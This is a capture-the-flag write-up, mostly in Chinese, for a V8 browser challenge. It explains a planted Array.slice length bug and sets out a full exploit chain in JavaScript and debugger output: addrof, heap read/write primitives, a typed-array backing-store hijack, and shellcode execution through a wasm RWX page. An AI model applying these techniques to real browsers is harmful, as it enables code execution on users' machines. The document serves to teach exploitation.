## 题目信息
pwn-or-web v8 challenge
```
Author: Faith

Why do some people think browser exploitation == web?

Once you get code execution, you can execute /chal/flagprinter to get the flag. No need to get a shell.

V8 commit: 47054c840e26394dea0e36df47884202a15dd16d V8 version: 8.7.9 nc chal.duc.tf 30004

Challenge files: https://storage.googleapis.com/files.duc.tf/uploads/pwn/is-this-pwn-or-web/challenge.tar.gz (sha256: e1c70edde66932ca3ee9285fe37c04254ae5a0e00b265c68fe93440bbe3256e8)
```
## patch
`src/builtins/array-slice.tq`中
```
-        return ExtractFastJSArray(context, a, start, count);
+        // return ExtractFastJSArray(context, a, start, count);
+        // Instead of doing it the usual way, I've found out that returning it
+        // the following way gives us a 10x speedup!
+        const array: JSArray = ExtractFastJSArray(context, a, start, count);
+        const newLength: Smi = Cast<Smi>(count - start + SmiConstant(2))
+            otherwise Bailout;
+        array.ChangeLength(newLength);
+        return array;
```
当start指定为0时，这里把数组的长度增加了2，导致我们可以读写array elements后两个元素的值。

## 利用

### JSArray结构
对于这样一个array
```
a = [1.1, 2.2, 3.3, 4.4]
```
在slice之后
```
d8> b = a.slice(0)
[1.1, 2.2, 3.3, 4.4, , ]
d8> b.length
6
d8> b[4]
4.768128617178215e-270
d8> b[5]
2.5530533391e-313
```

```
a = [1.1, 2.2, 3.3];

DebugPrint: 0xe3b08085aa9: [JSArray]
 - map: 0x0e3b082438fd <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
 - prototype: 0x0e3b0820a555 <JSArray[0]>
 - elements: 0x0e3b08085a89 <FixedDoubleArray[3]> [PACKED_DOUBLE_ELEMENTS]
 - length: 3
 - properties: 0x0e3b080426dd <FixedArray[0]> {
    0xe3b08044649: [String] in ReadOnlySpace: #length: 0x0e3b08182159 <AccessorInfo> (const accessor descriptor)
 }
 - elements: 0x0e3b08085a89 <FixedDoubleArray[3]> {
           0: 1.1
           1: 2.2
           2: 3.3
 }
```
查看elements
```
pwndbg> x/10gx 0x0e3b08085a89-1
0xe3b08085a88:	0x0000000608042a31	0x3ff199999999999a （1.1）
0xe3b08085a98:	0x400199999999999a（2.2）	0x400a666666666666 （3.3）
0xe3b08085aa8:	0x080426dd082438fd （map ptr）	0x0000000608085a89   (element ptr)
0xe3b08085ab8:	0x00000006080424a5	0x08085af908085acd
0xe3b08085ac8:	0x0824579d08085b25	0x080426dd080426dd

pwndbg> x/10gf 0x0e3b08085a89-1
0xe3b08085a88:	1.2798421967007003e-313	1.1000000000000001
0xe3b08085a98:	2.2000000000000002	3.2999999999999998
0xe3b08085aa8:	4.7681286171782151e-270	1.2798557597908099e-313

```
```
                  +-------------+-------------+
   0x0e3b08085a88 |             |             |
          +------>|             |   1.1       |
          |       +---------------------------+
          |       |             |             |
          |       |    2.2      |   3.3       |
          |       +---------------------------+
          |       |             |  float_arr  |  0xe3b08085aa8
          |       |    4.4      |     map     |  JSArray start
          |       +---------------------------+
          |       | elements    |             |
          +-------+   ptr       |             |
                  +-------------+-------------+
```
元素的实际数值放置于`element_ptr+0x8`的地方

可控多出来的两个元素，分别为float_arr map和element ptr

### 浮点数与整数的转换
> Double: Shown as the 64-bit binary representation without any changes
> Smi: Represented as value << 32, i.e 0xdeadbeef is represented as 0xdeadbeef00000000
> Pointers: Represented as addr & 1. 0x2233ad9c2ed8 is represented as 0x2233ad9c2ed9

```
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) == float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) == BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
```

### addrof
修改float_arr的elements指针到obj_arr的 elements指针，这样通过把obj放到obj_arr，再从`float_arr`读取数据就能拿到obj的地址。

```
                 obj_arr                       float_arr
         +----------+---------+            +-----------+---------+
         |  map     | elems   |            | map       |elems    |
         |          |         |            |           |         |
         +----------+-----+---+            +-----------+-----+---+
                          |                                  |
                          +-----+----------------------------+
                                |
                                v
                          +--------------+
                          | obj ptr1     |+--->  {A:1.1}
                          +--------------+
                          | obj ptr2     |+--->  {B:2.2}
                          +--------------+
                          |  ...         |
                          |              |
                          |              |
                          |              |
                          +--------------+

```

泄露map ptr和 element ptr
```
a = [1.1, 2.2, 3.3];
b = [{A:1}, {B:2}, {C:3}];

float_arr = a.slice(0);
obj_arr = b.slice(0);

float_map = float_arr[3];
float_elems = float_arr[4];
```
调试可知`obj_map`,`obj_elems` 与`float_map`，`float_elems` 的偏移。
```
float_arr :

DebugPrint: 0x25b008085b59: [JSArray]
 - map: 0x25b0082438fd <Map(PACKED_DOUBLE_ELEMENTS)> [FastProperties]
...
 - elements: 0x25b008085b39 <FixedDoubleArray[3]> {
           0: 1.1
           1: 2.2
           2: 3.3
 }


obj_arr :

DebugPrint: 0x25b008085b7d: [JSArray]
 - map: 0x25b00824394d <Map(PACKED_ELEMENTS)> [FastProperties]
...
 - elements: 0x25b008085b69 <FixedArray[3]> {
           0: 0x25b008085aa5 <Object map = 0x25b00824579d>
           1: 0x25b008085ad1 <Object map = 0x25b0082457c5>
           2: 0x25b008085afd <Object map = 0x25b0082457ed>
 }

```
```
obj_map = itof(ftoi(float_map) + (0x50n));
obj_elems = itof(ftoi(float_elems) + (0x30n));
```
修改float_arr的elements指针到obj_arr的 elements指针
```
// hijack obj element ptr
float_arr[4]= obj_elems ;
```
addrof
```
function addrof(in_obj) {
        // put the obj into our object array
        obj_arr[0] = in_obj;

        // accessing the first element of the float array
        // treats the value there as a float:
        let addr = float_arr[0];

        // Convert to bigint
        return ftoi(addr);
}
```

###  Arbitrary read/write within v8 heap
修改elements指针到R/W的地址即可。
由于v8堆内使用了指针压缩，而base不可知，所以只能R/W堆内的地址(即传入的地址需要时压缩后的指针)
```
function arbi_r(target_addr){
    t=[1.1]
    // read is performed at addr + 0x8
    target_addr = target_addr - 0x8n

    // ensure addr is tagged as a pointer
    if (target_addr % 2n == 0) {
        target_addr += 1n;
    }
    
    hijacked_t = t.slice(0);
    hijacked_t[2]=itof(target_addr);

    return ftoi(hijacked_t[0]);

}

function arbi_w(target_addr, val) { // both as BigInts
    t = [1.1]

    // write is made at addr + 0x8
    target_addr = target_addr - 0x8n

    // ensure addr is tagged
    if (target_addr % 2n == 0) {
        target_addr += 1n;
    }

    tmp_arr = t.slice(0)
    // set elem ptr to desired address
    tmp_arr[2] = itof(target_addr)

    // set addr to desired value
    tmp_arr[0] = itof(val)
}
```


### 任意R/W
为了实现堆外的R/W，可以通过修改typed arrays的backing store为目标地址。
```
                v8 heap                          'actual' heap
        +----------------------------+        +---------------------+
        |                            |        |                     |
        |  buf    +--------------+   |      +-->                    |
        |         |              |   |      | |                     |
        |         |   . . .      |   |      | |                     |
        |         |              |   |      | +---------------------+
        |         |              |   |      |
        |         +--------------+   |      |
        |         |  backing     |   |      |
        |         |  store ptr   +----------+
        |         +--------------+   |
        +----------------------------+
```

```
var buf = new ArrayBuffer(0x100);
var uint8_arr = new Uint8Array(buf);
var buf_addr = addrof(buf);

// offset to backing store ptr at 0x60
var backing_addr = buf_addr + 0x60n

// overwrite backing store ptr so all uint8_arr access happen in the rwx segment
arbi_w(backing_addr, rwx)
```

### wasm中的RXW段
查看WasmInstanceObject的布局
```
DebugPrint: 0x360c08211751: [WasmInstanceObject] in OldSpace
 - map: 0x360c08245275 <Map(HOLEY_ELEMENTS)> [FastProperties]
 - prototype: 0x360c080835fd <Object map = 0x360c0824588d>
 - elements: 0x360c080426dd <FixedArray[0]> [HOLEY_ELEMENTS]
 - module_object: 0x360c080859ed <Module map = 0x360c0824510d>
 - exports_object: 0x360c08085b49 <Object map = 0x360c0824592d>
 - native_context: 0x360c0820221d <NativeContext[243]>
 - memory_object: 0x360c08211739 <Memory map = 0x360c0824551d>
 - table 0: 0x360c08085b1d <Table map = 0x360c0824538d>
 - imported_function_refs: 0x360c080426dd <FixedArray[0]>
 - indirect_function_table_refs: 0x360c080426dd <FixedArray[0]>
 - managed_native_allocations: 0x360c08085ad5 <Foreign>
 - memory_start: 0x7ffddc000000
 - memory_size: 65536
 - memory_mask: ffff
 - imported_function_targets: 0x555556ae9670
 - globals_start: (nil)
 - imported_mutable_globals: 0x555556ae9690
 - indirect_function_table_size: 0
 - indirect_function_table_sig_ids: (nil)
 - indirect_function_table_targets: (nil)
 - properties: 0x360c080426dd <FixedArray[0]> {}

```
```
pwndbg> telescope 0x360c08211751-1 20
00:0000│   0x360c08211750 ◂— 0x80426dd08245275
01:0008│   0x360c08211758 ◂— 0xdc000000080426dd
02:0010│   0x360c08211760 ◂— 0x1000000007ffd
03:0018│   0x360c08211768 ◂— 0xffff00000000
04:0020│   0x360c08211770 ◂— 0x4800000000
05:0028│   0x360c08211778 ◂— 0x80426dd0000360c /* '\x0c6' */
06:0030│   0x360c08211780 —▸ 0x555556ae9670 —▸ 0x7ffff73f2ca0 (main_arena+96) —▸ 0x555556b70780 ◂— 0x0
07:0038│   0x360c08211788 ◂— 0x80426dd
08:0040│   0x360c08211790 ◂— 0x0
... ↓
0b:0058│   0x360c082117a8 —▸ 0x555556ae9690 —▸ 0x7ffff73f2ca0 (main_arena+96) —▸ 0x555556b70780 ◂— 0x0
0c:0060│   0x360c082117b0 —▸ 0x360c00000000 —▸ 0x7fffffffd780 ◂— 0x360c00000000
0d:0068│   0x360c082117b8 —▸ 0xcff4e389000 ◂— jmp    0xcff4e3893a0 /* 0xcccccc0000039be9 */
0e:0070│   0x360c082117c0 ◂— 0x8085b49080859ed
0f:0078│   0x360c082117c8 ◂— 0x82117390820221d
10:0080│   0x360c082117d0 ◂— 0x804230108042301
11:0088│   0x360c082117d8 ◂— 0x8085b1108042301
12:0090│   0x360c082117e0 ◂— 0x8085ad508085b3d
13:0098│   0x360c082117e8 ◂— 0x8085b8108042301

```
其中`0x360c082117b8` (+0x68)处的地址`0xcff4e389000`处于RXW段
```
pwndbg> vmmap 
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
     0xcff4e389000      0xcff4e38a000 rwxp     1000 0  
```
向其中写入shellcode即可
```
var buf = new ArrayBuffer(0x100);
var uint8_arr = new Uint8Array(buf);
var buf_addr = addrof(buf);

// %DebugPrint(buf);
// %SystemBreak();
// offset to backing store ptr at 0x60
var backing_addr = buf_addr + 0x60n

// overwrite backing store ptr so all uint8_arr access happen in the rwx segment
arbi_w(backing_addr, rwx)

// backing store now points to the rwx segment, copy in our shellcode
for (let i = 0; i < shellcode.length; i++) {
    uint8_arr[i] = shellcode[i]
}

wasm_func();
```

## murmur
大致一道V8的题目，分为构造`addrof`, `(withinHeap) arbitraryR/W`,  `(allAddr) arbitraryR/W` 的primitive。 
其中可以通过`TypedArray`的`backing store`，实现任意地址的`arbitrary R/W`。
(https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html)


# reference
- https://seb-sec.github.io/2020/09/28/ductf2020-pwn-or-web.html
